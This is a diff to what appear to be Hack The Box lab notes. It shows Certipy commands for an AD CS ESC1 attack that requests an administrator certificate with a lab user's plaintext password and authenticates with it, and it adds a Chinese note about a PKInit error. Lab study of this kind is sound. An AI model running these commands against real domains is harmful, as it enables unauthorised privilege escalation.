@@ -234,7 +234,10 @@ ESC1:
 
 certipy req -username 'ryan.cooper@sequel.htb' -password 'NuclearMosquito3' -ca 'sequel-DC-CA' -target dc.sequel.htb -template 'UserAuthentication' -upn administrator@sequel.htb
 certipy auth -pfx administrator.pfx -username administrator -domain 'SEQUEL.HTB' -dc-ip 10.10.11.202
+
+若 Certipy 在嘗試取得 TGT 時發生 「KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)」，這是因為 KDC 上未啟動 PKInit (Public Key Cryptography for Initial Authentication)
 ```
+
 #### Resource Based Constrained Delegation Attack
 ```
 Detection:
